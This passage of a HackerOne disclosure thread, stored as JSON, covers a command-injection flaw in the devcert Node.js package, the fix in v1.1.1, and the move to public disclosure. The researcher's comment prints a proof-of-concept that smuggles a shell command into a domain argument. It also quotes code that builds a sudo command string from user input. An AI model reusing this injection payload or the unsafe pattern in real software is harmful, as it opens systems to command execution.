+      "message": "Hi @zetlen,\n\nthanks for your prompt reply and for your writeup.\n\nYour changes seems to fix the problem. \nI run the previous poc:\n```javascript\nconst devcert = require('devcert');\n\nasync function poc() {\n    let ssl = await devcert.certificateFor('\\\";touch HACKED;\\\"');\n}\npoc()\n```\nand I was not able to obtain the previous reported result.\n\n\nHowever, I noticed that in different files in [/platforms](https://github.com/davewasmer/devcert/tree/zetlen/fix-remoteexec/src/platforms) you changed the `run` method in different files, but there is still one case where the command is build formatting  the user input:\n```javascript\n// https://github.com/davewasmer/devcert/blob/zetlen/fix-remoteexec/src/platforms/win32.ts#L61\n  async addDomainToHostFileIfMissing(domain: string) {\n    let hostsFileContents = read(this.HOST_FILE_PATH, 'utf8');\n    if (!hostsFileContents.includes(domain)) {\n      await sudo(`echo 127.0.0.1  ${ domain } >> ${ this.HOST_FILE_PATH }`);  // <-- here\n    }\n  }\n  \n// https://github.com/davewasmer/devcert/blob/zetlen/fix-remoteexec/src/utils.ts#L48\n...\nimport sudoPrompt from 'sudo-prompt';\n...\nexport function sudo(cmd: string): Promise<string | null> {\n  return new Promise((resolve, reject) => {\n    sudoPrompt.exec(cmd, { name: 'devcert' }, (err: Error | null, stdout: string | null, stderr: string | null) => {\n      let error = err || (typeof stderr === 'string' && stderr.trim().length > 0 && new Error(stderr)) ;\n      error ? reject(error) : resolve(stdout);\n    });\n  });\n}\n```\n\n\nMaybe you didn't change it on purpose.  I just wanted to let you know. \nAlso I know that the only way to reach that code is to first pass this check:\n```javascript\n// https://github.com/davewasmer/devcert/blob/zetlen/fix-remoteexec/src/index.ts#L69\n....\nexport async function certificateFor<O extends Options>(domain: string, options: O = {} as O): Promise<IReturnData<O>> {\n  if (!VALID_DOMAIN.test(domain)) {\n...\n  if (!options.skipHostsFile) {\n    await currentPlatform.addDomainToHostFileIfMissing(domain);\n  }\n...\n```\n\nLet me know if I can do something else.\n\nHave a nice day,\nd3lla\n\nI tested using the following configurations:\n- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS\n- NODEJS VERSION: v14.2.0\n- NPM VERSION: 6.14.4\n\n",
+      "automated_response": false,
+      "created_at": "2020-06-09T21:53:17.202Z",
+      "updated_at": "2020-06-09T21:56:03.728Z",
+      "actor": {
+        "username": "d3lla",
+        "cleared": false,
+        "verified": false,
+        "url": "/d3lla",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 8248118,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thank you @d3lla . I did leave that one call to `sudo` in `src/platforms/win32.js` alone. Windows shell and PowerShell won't elevate permissions with a simple call to \"sudo\", which is why we need the third-party [sudo-prompt(https://github.com/jorangreef/sudo-prompt/blob/master/index.js). That library requires you to pass a string of legal POSIX shell. When the platform is Windows, it processes and sanitizes that input.\n\nBetween that and the regular expression check you also mentioned, I think this is very minimal surface area for future exploits--you'd have to have an undiscovered way to inject arbitrary PowerShell code through `sudo-prompt`.\n\nI'll leave this PR up for another 90 minutes, then merge it and release a patch.\n\nDo you have any recommendations for unpublishing and/or deprecating old versions with vulnerabilities like this?",
+      "automated_response": false,
+      "created_at": "2020-06-09T22:26:16.682Z",
+      "updated_at": "2020-06-09T22:26:16.682Z",
+      "actor": {
+        "username": "zetlen",
+        "cleared": false,
+        "verified": false,
+        "url": "/zetlen",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 8249530,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "I've published [`v1.1.1`](https://github.com/davewasmer/devcert/releases/tag/v1.1.1) to NPM and deprecated previous versions. Thanks for alerting me to this.",
+      "automated_response": false,
+      "created_at": "2020-06-10T03:00:45.469Z",
+      "updated_at": "2020-06-10T03:00:45.469Z",
+      "actor": {
+        "username": "zetlen",
+        "cleared": false,
+        "verified": false,
+        "url": "/zetlen",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 8251909,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@zetlen @d3lla thanks for collaborating on this. Now that the fix is out, can we disclose this vulnerability?",
+      "automated_response": false,
+      "created_at": "2020-06-10T09:11:31.987Z",
+      "updated_at": "2020-06-10T09:11:31.987Z",
+      "actor": {
+        "username": "marcinhoppe",
+        "cleared": false,
+        "verified": false,
+        "url": "/marcinhoppe",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 8252847,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @marcinhoppe , @zetlen , @davewasmer ,\nthanks for your quick responses and collaboration.\nIt was really a pleasure.\n\nFrom my side it's fine to disclose the report.\n\nInstead about the CVE, how does it work?\n\nThank you for your time and have a nice day,\nd3lla\n\n",
+      "automated_response": false,
+      "created_at": "2020-06-10T10:46:12.806Z",
+      "updated_at": "2020-06-10T10:52:37.316Z",
+      "actor": {
+        "username": "d3lla",
+        "cleared": false,
+        "verified": false,
+        "url": "/d3lla",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 8252916,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "I will request a CVE when the report has been disclosed.",
+      "automated_response": false,
+      "created_at": "2020-06-10T10:52:43.925Z",
+      "updated_at": "2020-06-10T10:52:43.925Z",
+      "actor": {
+        "username": "marcinhoppe",
+        "cleared": false,
+        "verified": false,
+        "url": "/marcinhoppe",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 8252931,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@marcinhoppe, ok thank you so much.\nd3lla\n",
+      "automated_response": false,
+      "created_at": "2020-06-10T10:54:28.961Z",
+      "updated_at": "2020-06-10T10:54:28.961Z",
+      "actor": {
+        "username": "d3lla",
+        "cleared": false,
+        "verified": false,
+        "url": "/d3lla",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 8253796,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Yes, please disclose the report. Is there anything else I can do?",
+      "automated_response": false,
+      "created_at": "2020-06-10T12:19:42.223Z",
+      "updated_at": "2020-06-10T12:19:42.223Z",
+      "actor": {
+        "username": "zetlen",
+        "cleared": false,
+        "verified": false,
+        "url": "/zetlen",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 8271515,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@zetlen looks like we are good to go. Many thanks for the prompt fix!",
+      "automated_response": false,
+      "created_at": "2020-06-12T10:10:14.173Z",
+      "updated_at": "2020-06-12T10:10:14.173Z",
+      "actor": {
+        "username": "marcinhoppe",
+        "cleared": false,
+        "verified": false,
+        "url": "/marcinhoppe",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 8271516,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-06-12T10:10:24.263Z",
+      "updated_at": "2020-06-12T10:10:24.263Z",
+      "actor": {
+        "username": "marcinhoppe",
+        "cleared": false,
+        "verified": false,
+        "url": "/marcinhoppe",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "d3lla",
+        "url": "/d3lla"
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 8271517,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-06-12T10:10:30.863Z",
+      "updated_at": "2020-06-12T10:10:30.863Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "marcinhoppe",
+        "cleared": false,
+        "verified": false,
+        "url": "/marcinhoppe",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 8296741,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-06-15T16:02:48.939Z",
+      "updated_at": "2020-06-15T16:02:48.939Z",
+      "actor": {
+        "username": "d3lla",
+        "cleared": false,
+        "verified": false,
+        "url": "/d3lla",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 8296742,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-06-15T16:02:48.998Z",
+      "updated_at": "2020-06-15T16:02:48.998Z",
+      "actor": {
+        "username": "d3lla",
+        "cleared": false,
+        "verified": false,
+        "url": "/d3lla",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 8303294,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ChangedScope",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-06-16T08:12:22.233Z",
+      "updated_at": "2020-06-16T08:12:22.233Z",
+      "actor": {
+        "username": "marcinhoppe",
+        "cleared": false,
+        "verified": false,
+        "url": "/marcinhoppe",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "old_scope": "Other module",
+      "new_scope": "devcert",
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 8303336,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "I requested a CVE for this report.",
+      "automated_response": false,
+      "created_at": "2020-06-16T08:18:37.441Z",
+      "updated_at": "2020-06-16T08:18:37.441Z",
+      "actor": {
+        "username": "marcinhoppe",
+        "cleared": false,
+        "verified": false,
+        "url": "/marcinhoppe",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
